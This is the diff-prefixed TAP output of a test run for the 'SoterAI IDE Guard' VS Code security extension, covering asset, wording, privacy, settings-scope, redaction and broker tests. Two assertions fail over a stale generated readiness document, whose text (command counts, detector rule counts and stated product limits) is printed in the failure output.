+    ok 6 - refuses restore without approval
+      ---
+      duration_ms: 3.2314
+      type: 'test'
+      ...
+    1..6
+ok 104 - IntegrationAdapter apply + restore (never silent)
+  ---
+  duration_ms: 24.2813
+  type: 'suite'
+  ...
+# Subtest: IntegrationAdapter health + stream smoke
+    # Subtest: reports health OK on 200
+    ok 1 - reports health OK on 200
+      ---
+      duration_ms: 1.3496
+      type: 'test'
+      ...
+    # Subtest: stream smoke fails closed without auth token
+    ok 2 - stream smoke fails closed without auth token
+      ---
+      duration_ms: 1.4949
+      type: 'test'
+      ...
+    # Subtest: stream smoke accepts non-404 route responses
+    ok 3 - stream smoke accepts non-404 route responses
+      ---
+      duration_ms: 0.8329
+      type: 'test'
+      ...
+    1..3
+ok 105 - IntegrationAdapter health + stream smoke
+  ---
+  duration_ms: 4.5711
+  type: 'suite'
+  ...
+# Subtest: manifest assets
+    # Subtest: declares at least the icons and walkthrough pages
+    ok 1 - declares at least the icons and walkthrough pages
+      ---
+      duration_ms: 3.8155
+      type: 'test'
+      ...
+    # Subtest: every declared asset exists on disk
+    ok 2 - every declared asset exists on disk
+      ---
+      duration_ms: 3.8099
+      type: 'test'
+      ...
+    # Subtest: no declared asset is excluded from the VSIX by .vscodeignore
+    ok 3 - no declared asset is excluded from the VSIX by .vscodeignore
+      ---
+      duration_ms: 6.7132
+      type: 'test'
+      ...
+    # Subtest: the activity-bar icon is maskable, not a raster or a filled glyph
+    ok 4 - the activity-bar icon is maskable, not a raster or a filled glyph
+      ---
+      duration_ms: 8.289
+      type: 'test'
+      ...
+    1..4
+ok 106 - manifest assets
+  ---
+  duration_ms: 26.1348
+  type: 'suite'
+  ...
+# Subtest: marketplace icon
+    # Subtest: points at the one approved brand mark
+    ok 1 - points at the one approved brand mark
+      ---
+      duration_ms: 1.2373
+      type: 'test'
+      ...
+    # Subtest: is collected by the asset walker, so the existence and .vscodeignore checks cover it
+    ok 2 - is collected by the asset walker, so the existence and .vscodeignore checks cover it
+      ---
+      duration_ms: 0.4222
+      type: 'test'
+      ...
+    # Subtest: is a real PNG with transparency, square, and big enough for the gallery
+    ok 3 - is a real PNG with transparency, square, and big enough for the gallery
+      ---
+      duration_ms: 15.1731
+      type: 'test'
+      ...
+    # Subtest: has not drifted from the website's copy of the same logo
+    ok 4 - has not drifted from the website's copy of the same logo
+      ---
+      duration_ms: 7.5087
+      type: 'test'
+      ...
+    1..4
+ok 107 - marketplace icon
+  ---
+  duration_ms: 26.2314
+  type: 'suite'
+  ...
+# Subtest: walkthrough media
+    # Subtest: ships no page the manifest does not reference
+    ok 1 - ships no page the manifest does not reference
+      ---
+      duration_ms: 1.9438
+      type: 'test'
+      ...
+    # Subtest: has one page per contributed step
+    ok 2 - has one page per contributed step
+      ---
+      duration_ms: 1.1253
+      type: 'test'
+      ...
+    1..2
+ok 108 - walkthrough media
+  ---
+  duration_ms: 3.6885
+  type: 'suite'
+  ...
+# Subtest: gallery banner
+    # Subtest: is the saffron brand colour on a light banner
+    ok 1 - is the saffron brand colour on a light banner
+      ---
+      duration_ms: 0.8299
+      type: 'test'
+      ...
+    1..1
+ok 109 - gallery banner
+  ---
+  duration_ms: 1.1296
+  type: 'suite'
+  ...
+# Subtest: Control Panel plain-language content
+    # Subtest: every always-visible string avoids internal vocabulary
+    ok 1 - every always-visible string avoids internal vocabulary
+      ---
+      duration_ms: 51.7785
+      type: 'test'
+      ...
+    # Subtest: task labels and hints avoid internal vocabulary too
+    ok 2 - task labels and hints avoid internal vocabulary too
+      ---
+      duration_ms: 2.1299
+      type: 'test'
+      ...
+    # Subtest: summaries stay short enough to read at a glance
+    ok 3 - summaries stay short enough to read at a glance
+      ---
+      duration_ms: 3.2655
+      type: 'test'
+      ...
+    # Subtest: keeps the honest caveat rather than deleting it
+    ok 4 - keeps the honest caveat rather than deleting it
+      ---
+      duration_ms: 7.7783
+      type: 'test'
+      ...
+    # Subtest: never claims a level stronger than the capability registry allows
+    ok 5 - never claims a level stronger than the capability registry allows
+      ---
+      duration_ms: 1.8129
+      type: 'test'
+      ...
+    # Subtest: shows no protection badge for a control that is off
+    ok 6 - shows no protection badge for a control that is off
+      ---
+      duration_ms: 0.6535
+      type: 'test'
+      ...
+    # Subtest: only claims enforcement for Safe Mode while local checking is actually running
+    ok 7 - only claims enforcement for Safe Mode while local checking is actually running
+      ---
+      duration_ms: 0.5475
+      type: 'test'
+      ...
+    1..7
+ok 110 - Control Panel plain-language content
+  ---
+  duration_ms: 73.7248
+  type: 'suite'
+  ...
+# Subtest: Control Panel privacy boundary
+    # Subtest: states that local mode keeps scan data on this device
+    ok 1 - states that local mode keeps scan data on this device
+      ---
+      duration_ms: 1.4246
+      type: 'test'
+      ...
+    # Subtest: does not imply cloud transfer merely because cloud is configured
+    ok 2 - does not imply cloud transfer merely because cloud is configured
+      ---
+      duration_ms: 1.5513
+      type: 'test'
+      ...
+    # Subtest: makes optional metadata collection explicit without claiming content upload
+    ok 3 - makes optional metadata collection explicit without claiming content upload
+      ---
+      duration_ms: 2.9171
+      type: 'test'
+      ...
+    # Subtest: states that an untrusted workspace cannot send
+    ok 4 - states that an untrusted workspace cannot send
+      ---
+      duration_ms: 0.625
+      type: 'test'
+      ...
+    1..4
+ok 111 - Control Panel privacy boundary
+  ---
+  duration_ms: 9.0291
+  type: 'suite'
+  ...
+# Subtest: Control Panel primary action
+    # Subtest: offers exactly one action for every reachable state
+    ok 1 - offers exactly one action for every reachable state
+      ---
+      duration_ms: 3.5576
+      type: 'test'
+      ...
+    # Subtest: offers a way out of lockdown
+    ok 2 - offers a way out of lockdown
+      ---
+      duration_ms: 0.6545
+      type: 'test'
+      ...
+    # Subtest: asks for setup first when nothing can be blocked yet
+    ok 3 - asks for setup first when nothing can be blocked yet
+      ---
+      duration_ms: 0.517
+      type: 'test'
+      ...
+    # Subtest: does not push more setup when everything supported is already on
+    ok 4 - does not push more setup when everything supported is already on
+      ---
+      duration_ms: 0.3288
+      type: 'test'
+      ...
+    # Subtest: does not offer a no-op full-protection action when all visible controls are on
+    ok 5 - does not offer a no-op full-protection action when all visible controls are on
+      ---
+      duration_ms: 0.3987
+      type: 'test'
+      ...
+    # Subtest: every action it can emit is allowlisted by the provider
+    ok 6 - every action it can emit is allowlisted by the provider
+      ---
+      duration_ms: 2.3567
+      type: 'test'
+      ...
+    # Subtest: puts the highest-value protection flows first and secondary checks behind disclosure
+    ok 7 - puts the highest-value protection flows first and secondary checks behind disclosure
+      ---
+      duration_ms: 2.9667
+      type: 'test'
+      ...
+    # Subtest: task icons are real line icons, not emoji
+    ok 8 - task icons are real line icons, not emoji
+      ---
+      duration_ms: 0.6728
+      type: 'test'
+      ...
+    1..8
+ok 112 - Control Panel primary action
+  ---
+  duration_ms: 12.7363
+  type: 'suite'
+  ...
+# Subtest: does not call protection fully enforced when one required control is missing
+ok 113 - does not call protection fully enforced when one required control is missing
+  ---
+  duration_ms: 4.7015
+  type: 'test'
+  ...
+# Subtest: reports bypass when a routable AI tool is not routed through SoterAI
+ok 114 - reports bypass when a routable AI tool is not routed through SoterAI
+  ---
+  duration_ms: 1.2621
+  type: 'test'
+  ...
+# Subtest: reports monitoring only when the broker is healthy but no enforcement is enabled
+ok 115 - reports monitoring only when the broker is healthy but no enforcement is enabled
+  ---
+  duration_ms: 0.7474
+  type: 'test'
+  ...
+# Subtest: reports fully enforced only when required controls and all detected tools are verified
+ok 116 - reports fully enforced only when required controls and all detected tools are verified
+  ---
+  duration_ms: 0.4209
+  type: 'test'
+  ...
+# Subtest: lockdown has priority over all other runtime facts
+ok 117 - lockdown has priority over all other runtime facts
+  ---
+  duration_ms: 0.4736
+  type: 'test'
+  ...
+# Subtest: a tool SoterAI cannot route is a stated limit, not a bypass
+ok 118 - a tool SoterAI cannot route is a stated limit, not a bypass
+  ---
+  duration_ms: 0.9117
+  type: 'test'
+  ...
+# Subtest: fully enforced is reachable on a real machine
+ok 119 - fully enforced is reachable on a real machine
+  ---
+  duration_ms: 2.3927
+  type: 'test'
+  ...
+# Subtest: broker offline is an error only when something depends on the broker
+ok 120 - broker offline is an error only when something depends on the broker
+  ---
+  duration_ms: 0.9136
+  type: 'test'
+  ...
+# Subtest: policy unavailable is not a red banner unless enforcement is actually on
+ok 121 - policy unavailable is not a red banner unless enforcement is actually on
+  ---
+  duration_ms: 1.3389
+  type: 'test'
+  ...
+# Subtest: MCP governance is disclosed as advisory rather than gating the claim
+ok 122 - MCP governance is disclosed as advisory rather than gating the claim
+  ---
+  duration_ms: 1.8419
+  type: 'test'
+  ...
+# Subtest: the coverage line never invents protection it cannot prove
+ok 123 - the coverage line never invents protection it cannot prove
+  ---
+  duration_ms: 0.9771
+  type: 'test'
+  ...
+# Subtest: the canonical readiness doc is generated, not maintained
+    # Subtest: exists
+    ok 1 - exists
+      ---
+      duration_ms: 5.7872
+      type: 'test'
+      ...
+    # Subtest: matches what the generator produces from source right now
+    not ok 2 - matches what the generator produces from source right now
+      ---
+      duration_ms: 1018.3705
+      type: 'test'
+      location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\readiness-doc.test.ts:2:1738'
+      failureType: 'testCodeFailure'
+      error: |-
+        Got unwanted exception: the readiness doc has drifted from the manifest/source; run: node scripts/generate-readiness.mjs
+        Actual message: "Command failed: C:\Program Files\nodejs\node.exe C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\scripts\generate-readiness.mjs --check
+        C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\docs\vscode-extension-readiness.md has drifted from the source. Run: node scripts/generate-readiness.mjs
+        "
+      code: 'ERR_ASSERTION'
+      name: 'AssertionError'
+      actual:
+      error: |-
+        Command failed: C:\Program Files\nodejs\node.exe C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\scripts\generate-readiness.mjs --check
+        C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\docs\vscode-extension-readiness.md has drifted from the source. Run: node scripts/generate-readiness.mjs
+        
+      stack: |-
+        genericNodeError (node:internal/errors:983:15)
+        wrappedFn (node:internal/errors:537:14)
+        checkExecSyncError (node:child_process:882:11)
+        execFileSync (node:child_process:918:15)
+        <anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\readiness-doc.test.ts:41:19)
+        getActual (node:assert:531:5)
+        Function.doesNotThrow (node:assert:697:32)
+        TestContext.<anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\readiness-doc.test.ts:40:16)
+        Test.runInAsyncScope (node:async_hooks:214:14)
+        Test.run (node:internal/test_runner/test:1047:25)
+      operator: 'doesNotThrow'
+      stack: |-
+        TestContext.<anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\readiness-doc.test.ts:40:16)
+        Test.runInAsyncScope (node:async_hooks:214:14)
+        Test.run (node:internal/test_runner/test:1047:25)
+        Suite.processPendingSubtests (node:internal/test_runner/test:744:18)
+        Test.postRun (node:internal/test_runner/test:1173:19)
+        Test.run (node:internal/test_runner/test:1101:12)
+        async Promise.all (index 0)
+        async Suite.run (node:internal/test_runner/test:1442:7)
+        async startSubtestAfterBootstrap (node:internal/test_runner/harness:296:3)
+      ...
+    # Subtest: says out loud that it is generated
+    ok 3 - says out loud that it is generated
+      ---
+      duration_ms: 4.096
+      type: 'test'
+      ...
+    1..3
+not ok 124 - the canonical readiness doc is generated, not maintained
+  ---
+  duration_ms: 1033.0358
+  type: 'suite'
+  location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\readiness-doc.test.ts:2:1473'
+  failureType: 'subtestsFailed'
+  error: '1 subtest failed'
+  code: 'ERR_TEST_FAILURE'
+  ...
+# Subtest: the readiness doc states the real, current numbers
+    # Subtest: names the version being published
+    ok 1 - names the version being published
+      ---
+      duration_ms: 1.0413
+      type: 'test'
+      ...
+    # Subtest: names the license that actually ships
+    ok 2 - names the license that actually ships
+      ---
+      duration_ms: 0.9096
+      type: 'test'
+      ...
+    # Subtest: states the command count the manifest actually declares
+    not ok 3 - states the command count the manifest actually declares
+      ---
+      duration_ms: 1.2259
+      type: 'test'
+      location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\readiness-doc.test.ts:2:3051'
+      failureType: 'testCodeFailure'
+      error: 'doc must state 168 commands'
+      code: 'ERR_ASSERTION'
+      name: 'AssertionError'
+      expected:
+      actual: |-
+        <!-- GENERATED FILE — do not edit.
+             Produced by packages/vscode-extension/scripts/generate-readiness.mjs and
+             asserted by src/__tests__/readiness-doc.test.ts. Every number below was
+             read from the manifest or from guard-core source at generation time.
+             Run `node scripts/generate-readiness.mjs` after changing either. -->
+        
+        # SoterAI IDE Guard — readiness
+        
+        **Package:** `soterai-ide-guard` v0.6.3 · publisher `soterai`
+        **License:** `SEE LICENSE IN LICENSE.md`
+        **Editor floor:** `^1.85.0` — kept deliberately low so Cursor, Windsurf, Kiro and Antigravity stay supported.
+        **Entry point:** `./dist/extension.js` (single esbuild bundle; no `node_modules` in the VSIX)
+        
+        ## Command surface
+        
+        | Measure | Count |
+        | --- | --- |
+        | Commands declared and registered | 163 |
+        | Visible in the palette by default | 11 |
+        | Behind `soterai.showAllCommands` | 125 |
+        | Hidden from the palette (aliases, reports, internal) | 27 |
+        
+        Hidden commands remain **registered**: a keybinding, task or another
+        extension's `executeCommand` that references one keeps working. They are
+        hidden because a second palette row for the same workflow makes the user
+        guess which one acts.
+        
+        ## Where the product meets the user
+        
+        | Surface | Detail |
+        | --- | --- |
+        | Non-palette menu groups | editor/context, soterai.editorContext, explorer/context, soterai.explorerContext, scm/title, view/title |
+        | Keybindings | 2 |
+        | View welcome messages | 4 |
+        | Walkthrough steps | 3 |
+        | Activation | workspaceContains:.soterai-policy.json, onWalkthrough:soterai.gettingStarted, onStartupFinished |
+        
+        ## Agent-facing surfaces
+        
+        - Language model tools: `soterai_scan_text`, `soterai_check_command`, `soterai_check_dependency`
+        - MCP server definition providers: `soterai.guard-tools`
+        
+        Both are feature-detected. On an editor without `vscode.lm` they register
+        nothing rather than throwing. **They are advisory:** they answer questions an
+        agent chooses to ask, and no extension API can force the call or intercept
+        what an agent does on its own.
+        
+        ## Settings and central management
+        
+        | Measure | Count |
+        | --- | --- |
+        | Settings declared | 31 |
+        | `machine`-scoped (a repo cannot set them) | 26 |
+        | Restricted in untrusted workspaces | 26 |
+        | Pinnable by an administrator (`policy`) | 8 |
+        
+        ## Detection engine
+        
+        | Detector | Rules |
+        | --- | --- |
+        | `AIGeneratedCodeRiskDetector` | 18 |
+        | `EnvFileDetector` | 4 |
+        | `FileContextRiskDetector` | 12 |
+        | `IndiaPIIDetector` | 7 |
+        | `JailbreakLiteDetector` | 19 |
+        | `MCPConfigRiskDetector` | 6 |
+        | `OutputExfiltrationDetector` | 6 |
+        | `PIIDetector` | 7 |
+        | `PromptInjectionLiteDetector` | 36 |
+        | `RepoInstructionPoisoningDetector` | 8 |
+        | `SecretDetector` | 36 |
+        | `TerminalCommandRiskDetector` | 21 |
+        | **Total** | **180** |
+        
+        All 12 detectors are deterministic regex/heuristic rules, bundled inline.
+        **No ML model ships in the VSIX.** `onnxruntime` appears zero times in
+        `dist/extension.js`; the ONNX classifier is server-side only. Any extension-
+        facing claim of ML capability is a defect.
+        
+        ## What this product does not do
+        
+        - It cannot intercept another extension's network calls. VS Code exposes no
+          such API, so GitHub Copilot is classified `unmanaged` and stays that way.
+        - Terminal commands are detected **after** the shell starts them. That path is
+          `MONITORED`; only the broker's controlled terminal blocks before execution.
+        - Anything not routed through the local broker is advisory, and every surface
+          says so rather than showing `ENFORCED`.
+        
+        
+      operator: 'match'
+      stack: |-
+        TestContext.<anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\readiness-doc.test.ts:71:16)
+        Test.runInAsyncScope (node:async_hooks:214:14)
+        Test.run (node:internal/test_runner/test:1047:25)
+        Suite.processPendingSubtests (node:internal/test_runner/test:744:18)
+        Test.postRun (node:internal/test_runner/test:1173:19)
+        Test.run (node:internal/test_runner/test:1101:12)
+        async Suite.processPendingSubtests (node:internal/test_runner/test:744:7)
+      ...
+    # Subtest: states the setting and policy counts the manifest actually declares
+    ok 4 - states the setting and policy counts the manifest actually declares
+      ---
+      duration_ms: 2.2314
+      type: 'test'
+      ...
+    # Subtest: claims no ML in the packaged extension
+    ok 5 - claims no ML in the packaged extension
+      ---
+      duration_ms: 1.2544
+      type: 'test'
+      ...
+    # Subtest: keeps the permanent limitations in the document, not just in the code
+    ok 6 - keeps the permanent limitations in the document, not just in the code
+      ---
+      duration_ms: 1.133
+      type: 'test'
+      ...
+    1..6
+not ok 125 - the readiness doc states the real, current numbers
+  ---
+  duration_ms: 10.6594
+  type: 'suite'
+  location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\readiness-doc.test.ts:2:2440'
+  failureType: 'subtestsFailed'
+  error: '1 subtest failed'
+  code: 'ERR_TEST_FAILURE'
+  ...
+# Subtest: stale documents do not contradict the shipped product
+    # Subtest: vscode-extension-marketplace-readiness.md no longer states a contradicted number
+    ok 1 - vscode-extension-marketplace-readiness.md no longer states a contradicted number
+      ---
+      duration_ms: 0.9347
+      type: 'test'
+      ...
+    # Subtest: no extension-facing document advertises a detection-rule count the source does not back
+    ok 2 - no extension-facing document advertises a detection-rule count the source does not back
+      ---
+      duration_ms: 12.9238
+      type: 'test'
+      ...
+    1..2
+ok 126 - stale documents do not contradict the shipped product
+  ---
+  duration_ms: 16.6182
+  type: 'suite'
+  ...
+# Subtest: README accuracy
+    # Subtest: names only commands that exist
+    ok 1 - names only commands that exist
+      ---
+      duration_ms: 7.6741
+      type: 'test'
+      ...
+    # Subtest: names only settings that exist, with the manifest's real defaults
+    ok 2 - names only settings that exist, with the manifest's real defaults
+      ---
+      duration_ms: 2.4381
+      type: 'test'
+      ...
+    # Subtest: does not advertise a version other than the one being published
+    ok 3 - does not advertise a version other than the one being published
+      ---
+      duration_ms: 1.2388
+      type: 'test'
+      ...
+    # Subtest: points at a license file that ships in the VSIX
+    ok 4 - points at a license file that ships in the VSIX
+      ---
+      duration_ms: 26.2223
+      type: 'test'
+      ...
+    # Subtest: states the real count of machine-scoped settings
+    ok 5 - states the real count of machine-scoped settings
+      ---
+      duration_ms: 1.722
+      type: 'test'
+      ...
+    1..5
+ok 127 - README accuracy
+  ---
+  duration_ms: 43.5926
+  type: 'suite'
+  ...
+# Subtest: marketplace listing links
+    # Subtest: declares every field the listing sidebar renders
+    ok 1 - declares every field the listing sidebar renders
+      ---
+      duration_ms: 2.6293
+      type: 'test'
+      ...
+    # Subtest: uses https everywhere, so no link downgrades the connection
+    ok 2 - uses https everywhere, so no link downgrades the connection
+      ---
+      duration_ms: 0.4999
+      type: 'test'
+      ...
+    # Subtest: points its own links at the apex domain the publisher verifies
+    ok 3 - points its own links at the apex domain the publisher verifies
+      ---
+      duration_ms: 0.5307
+      type: 'test'
+      ...
+    # Subtest: keeps the repository and issue links on the same repo
+    ok 4 - keeps the repository and issue links on the same repo
+      ---
+      duration_ms: 0.7205
+      type: 'test'
+      ...
+    1..4
+ok 128 - marketplace listing links
+  ---
+  duration_ms: 9.0743
+  type: 'suite'
+  ...
+# Subtest: README links header
+    # Subtest: offers a way to the site, the docs, support, and the issue tracker
+    ok 1 - offers a way to the site, the docs, support, and the issue tracker
+      ---
+      duration_ms: 0.863
+      type: 'test'
+      ...
+    # Subtest: agrees with the manifest instead of drifting from it
+    ok 2 - agrees with the manifest instead of drifting from it
+      ---
+      duration_ms: 0.4977
+      type: 'test'
+      ...
+    # Subtest: uses https so the marketplace page never links out over http
+    ok 3 - uses https so the marketplace page never links out over http
+      ---
+      duration_ms: 5.1933
+      type: 'test'
+      ...
+    1..3
+ok 129 - README links header
+  ---
+  duration_ms: 7.8619
+  type: 'suite'
+  ...
+# Subtest: Control Panel resource links
+    # Subtest: allowlists every link action, or the button is dead
+    ok 1 - allowlists every link action, or the button is dead
+      ---
+      duration_ms: 0.5953
+      type: 'test'
+      ...
+    # Subtest: takes the destination from the hardcoded table, never from the message
+    ok 2 - takes the destination from the hardcoded table, never from the message
+      ---
+      duration_ms: 1.6257
+      type: 'test'
+      ...
+    # Subtest: opens only https destinations already named in the README
+    ok 3 - opens only https destinations already named in the README
+      ---
+      duration_ms: 1.249
+      type: 'test'
+      ...
+    1..3
+ok 130 - Control Panel resource links
+  ---
+  duration_ms: 4.3976
+  type: 'suite'
+  ...
+# Subtest: LiveScanner exclude globs actually exclude
+    # Subtest: matches every shipped default exclude against a path it must skip
+    ok 1 - matches every shipped default exclude against a path it must skip
+      ---
+      duration_ms: 9.7483
+      type: 'test'
+      ...
+    # Subtest: matches a top-level path with the leading **/ segment absent
+    ok 2 - matches a top-level path with the leading **/ segment absent
+      ---
+      duration_ms: 0.7715
+      type: 'test'
+      ...
+    # Subtest: does not over-match source files that must still be scanned
+    ok 3 - does not over-match source files that must still be scanned
+      ---
+      duration_ms: 0.7995
+      type: 'test'
+      ...
+    # Subtest: treats an uncompilable pattern as non-matching instead of throwing
+    ok 4 - treats an uncompilable pattern as non-matching instead of throwing
+      ---
+      duration_ms: 0.9478
+      type: 'test'
+      ...
+    # Subtest: stays in sync with LiveScanner.ts
+    ok 5 - stays in sync with LiveScanner.ts
+      ---
+      duration_ms: 3.5935
+      type: 'test'
+      ...
+    1..5
+ok 131 - LiveScanner exclude globs actually exclude
+  ---
+  duration_ms: 23.6295
+  type: 'suite'
+  ...
+# Subtest: configuration scope — a workspace cannot disable protection
+    # Subtest: soterai.protection.enabled is machine-scoped
+    ok 1 - soterai.protection.enabled is machine-scoped
+      ---
+      duration_ms: 3.55
+      type: 'test'
+      ...
+    # Subtest: soterai.liveScan.enabled is machine-scoped
+    ok 2 - soterai.liveScan.enabled is machine-scoped
+      ---
+      duration_ms: 0.956
+      type: 'test'
+      ...
+    # Subtest: soterai.sentinel.enabled is machine-scoped
+    ok 3 - soterai.sentinel.enabled is machine-scoped
+      ---
+      duration_ms: 1.5272
+      type: 'test'
+      ...
+    # Subtest: soterai.protectedWorkspace.enabled is machine-scoped
+    ok 4 - soterai.protectedWorkspace.enabled is machine-scoped
+      ---
+      duration_ms: 0.829
+      type: 'test'
+      ...
+    # Subtest: soterai.mcpFirewall.strictMode is machine-scoped
+    ok 5 - soterai.mcpFirewall.strictMode is machine-scoped
+      ---
+      duration_ms: 0.7098
+      type: 'test'
+      ...
+    # Subtest: soterai.broker.openAIProviderUrl is machine-scoped
+    ok 6 - soterai.broker.openAIProviderUrl is machine-scoped
+      ---
+      duration_ms: 0.267
+      type: 'test'
+      ...
+    # Subtest: soterai.broker.anthropicProviderUrl is machine-scoped
+    ok 7 - soterai.broker.anthropicProviderUrl is machine-scoped
+      ---
+      duration_ms: 0.2535
+      type: 'test'
+      ...
+    # Subtest: soterai.broker.port is machine-scoped
+    ok 8 - soterai.broker.port is machine-scoped
+      ---
+      duration_ms: 0.8425
+      type: 'test'
+      ...
+    # Subtest: soterai.cloud.enabled is machine-scoped
+    ok 9 - soterai.cloud.enabled is machine-scoped
+      ---
+      duration_ms: 0.5555
+      type: 'test'
+      ...
+    # Subtest: soterai.cloud.baseUrl is machine-scoped
+    ok 10 - soterai.cloud.baseUrl is machine-scoped
+      ---
+      duration_ms: 0.2612
+      type: 'test'
+      ...
+    # Subtest: soterai.privacyMode is machine-scoped
+    ok 11 - soterai.privacyMode is machine-scoped
+      ---
+      duration_ms: 0.4956
+      type: 'test'
+      ...
+    # Subtest: soterai.policy.mode is machine-scoped
+    ok 12 - soterai.policy.mode is machine-scoped
+      ---
+      duration_ms: 0.408
+      type: 'test'
+      ...
+    # Subtest: soterai.audit.storeRawPrompts is machine-scoped
+    ok 13 - soterai.audit.storeRawPrompts is machine-scoped
+      ---
+      duration_ms: 0.2143
+      type: 'test'
+      ...
+    # Subtest: soterai.telemetry.redactedEvents is machine-scoped
+    ok 14 - soterai.telemetry.redactedEvents is machine-scoped
+      ---
+      duration_ms: 0.1974
+      type: 'test'
+      ...
+    # Subtest: soterai.sensitiveContext.allowRawReveal is machine-scoped
+    ok 15 - soterai.sensitiveContext.allowRawReveal is machine-scoped
+      ---
+      duration_ms: 0.1885
+      type: 'test'
+      ...
+    # Subtest: soterai.sensitiveContext.requireApproval is machine-scoped
+    ok 16 - soterai.sensitiveContext.requireApproval is machine-scoped
+      ---
+      duration_ms: 0.18
+      type: 'test'
+      ...
+    # Subtest: soterai.sensitiveContext.defaultAction is machine-scoped
+    ok 17 - soterai.sensitiveContext.defaultAction is machine-scoped
+      ---
+      duration_ms: 0.1703
+      type: 'test'
+      ...
+    # Subtest: soterai.sensitiveContext.ttlMinutes is machine-scoped
+    ok 18 - soterai.sensitiveContext.ttlMinutes is machine-scoped
+      ---
+      duration_ms: 0.342
+      type: 'test'
+      ...
+    # Subtest: soterai.scan.remoteEscalation is machine-scoped
+    ok 19 - soterai.scan.remoteEscalation is machine-scoped
+      ---
+      duration_ms: 0.3859
+      type: 'test'
+      ...
+    # Subtest: soterai.terminal.protectionMode is machine-scoped
+    ok 20 - soterai.terminal.protectionMode is machine-scoped
+      ---
+      duration_ms: 0.2069
+      type: 'test'
+      ...
+    # Subtest: soterai.terminal.warnOnRawTerminalOpen is machine-scoped
+    ok 21 - soterai.terminal.warnOnRawTerminalOpen is machine-scoped
+      ---
+      duration_ms: 0.1948
+      type: 'test'
+      ...
+    # Subtest: soterai.sentinel.retentionDays is machine-scoped
+    ok 22 - soterai.sentinel.retentionDays is machine-scoped
+      ---
+      duration_ms: 0.1793
+      type: 'test'
+      ...
+    # Subtest: soterai.dependencyGuard.osvMode is machine-scoped
+    ok 23 - soterai.dependencyGuard.osvMode is machine-scoped
+      ---
+      duration_ms: 0.1992
+      type: 'test'
+      ...
+    # Subtest: soterai.secretInterceptor.enabled is machine-scoped
+    ok 24 - soterai.secretInterceptor.enabled is machine-scoped
+      ---
+      duration_ms: 0.218
+      type: 'test'
+      ...
+    # Subtest: declares the same keys as restricted in untrusted workspaces
+    ok 25 - declares the same keys as restricted in untrusted workspaces
+      ---
+      duration_ms: 0.7813
+      type: 'test'
+      ...
+    # Subtest: keeps the untrusted-workspace support level declared
+    ok 26 - keeps the untrusted-workspace support level declared
+      ---
+      duration_ms: 0.3448
+      type: 'test'
+      ...
+    # Subtest: never writes a machine-scoped key to Workspace or WorkspaceFolder
+    ok 27 - never writes a machine-scoped key to Workspace or WorkspaceFolder
+      ---
+      duration_ms: 209.2214
+      type: 'test'
+      ...
+    1..27
+ok 132 - configuration scope — a workspace cannot disable protection
+  ---
+  duration_ms: 229.6245
+  type: 'suite'
+  ...
+# Subtest: SecretReferenceManager
+    # Subtest: creates opaque refs without embedding raw values
+    ok 1 - creates opaque refs without embedding raw values
+      ---
+      duration_ms: 9.0834
+      type: 'test'
+      ...
+    # Subtest: enforces lookup, expiry, revocation, workspace, operation, and one-time scopes
+    ok 2 - enforces lookup, expiry, revocation, workspace, operation, and one-time scopes
+      ---
+      duration_ms: 23.608
+      type: 'test'
+      ...
+    1..2
+ok 133 - SecretReferenceManager
+  ---
+  duration_ms: 38.8033
+  type: 'suite'
+  ...
+# Subtest: SensitiveContextRedactor
+    # Subtest: redacts env secrets into useful secret refs and strips raw values
+    ok 1 - redacts env secrets into useful secret refs and strips raw values
+      ---
+      duration_ms: 8.3153
+      type: 'test'
+      ...
+    # Subtest: redacts private keys, webhook URLs, India PII, and preserves benign text
+    ok 2 - redacts private keys, webhook URLs, India PII, and preserves benign text
+      ---
+      duration_ms: 3.2641
+      type: 'test'
+      ...
+    # Subtest: does not false-redact benign version-like text
+    ok 3 - does not false-redact benign version-like text
+      ---
+      duration_ms: 2.6928
+      type: 'test'
+      ...
+    1..3
+ok 134 - SensitiveContextRedactor
+  ---
+  duration_ms: 15.3532
+  type: 'suite'
+  ...
+# Subtest: CapabilityBroker
+    # Subtest: allows approved safe operations and never returns raw secrets
+    ok 1 - allows approved safe operations and never returns raw secrets
+      ---
+      duration_ms: 3.0104
+      type: 'test'
+      ...
+    # Subtest: blocks denied, malicious, expired, and unapproved operations with sanitized errors
+    ok 2 - blocks denied, malicious, expired, and unapproved operations with sanitized errors
+      ---
+      duration_ms: 30.4547
+      type: 'test'
+      ...
+    1..2
+ok 135 - CapabilityBroker
+  ---
+  duration_ms: 43.4298
+  type: 'suite'
+  ...
+# Subtest: LLM context and output filtering
+    # Subtest: builds a safe LLM contract without raw secrets and resists override text
+    ok 1 - builds a safe LLM contract without raw secrets and resists override text
+      ---
+      duration_ms: 2.4388
+      type: 'test'
+      ...
+    # Subtest: blocks requests for secrets and redacts secret-like model output
+    ok 2 - blocks requests for secrets and redacts secret-like model output
+      ---
+      duration_ms: 6.4792
+      type: 'test'
+      ...
+    1..2
+ok 136 - LLM context and output filtering
+  ---
+  duration_ms: 10.1321
+  type: 'suite'
+  ...
+# Subtest: Policy file parser
+    # Subtest: loads safe defaults, denies reveal, and applies enterprise lock
+    ok 1 - loads safe defaults, denies reveal, and applies enterprise lock
+      ---
+      duration_ms: 1.4319
+      type: 'test'
+      ...
+    # Subtest: requiresApproval defaults on and reflects policy
+    ok 2 - requiresApproval defaults on and reflects policy
+      ---
+      duration_ms: 0.5064
+      type: 'test'
+      ...
+    1..2
+ok 137 - Policy file parser
